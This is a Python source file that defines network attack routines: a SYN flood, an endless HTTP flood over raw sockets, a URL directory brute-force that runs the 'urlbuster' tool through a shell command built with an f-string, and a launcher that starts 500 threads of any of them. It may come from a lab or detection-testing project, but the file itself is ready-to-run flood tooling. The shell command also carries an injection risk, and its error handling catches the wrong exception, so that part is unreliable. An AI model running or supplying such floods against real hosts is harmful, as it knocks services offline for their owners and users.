import subprocess
from multiprocessing.pool import ThreadPool
from socket import SOCK_STREAM, AF_INET, socket, error as socket_error
from threading import Thread
from typing import Callable
from SynFlood import synflood, conf_iface

from utils.consts import HOST_IP, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, HTTP_FLOOD_REQUEST


def syn_flood_attack() -> None:
    synflood(HOST_IP, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, conf_iface)


def url_buster_attack() -> None:
    global url_wordlist
    try:
        URLBUSTER_COMMMAND = f'urlbuster -w {url_wordlist.pop()} http://{HOST_IP}:{HOST_PORT}/'
        print(subprocess.run(URLBUSTER_COMMMAND, shell=True, executable="/bin/bash"))
    except ValueError as e:
        # It is possible for a thread to pop once the wordlist is empty
        pass


def http_flood_attack() -> None:
    while True:
        with socket(AF_INET, SOCK_STREAM) as s:
            try:
                s.connect((HOST_IP, HOST_PORT))
                s.sendall(HTTP_FLOOD_REQUEST)
            except socket_error:
                pass


def create_multithreaded_attack(func: Callable) -> None:
    for _ in range(500):
        thread = Thread(target=func)
        thread.start()


def create_url_wordlist() -> None:
    global url_wordlist
    url_wordlist = set()
    with open('utils/wordlist.txt', 'r') as wordlist:
        for word in wordlist.read().splitlines():
            url_wordlist.add(word)
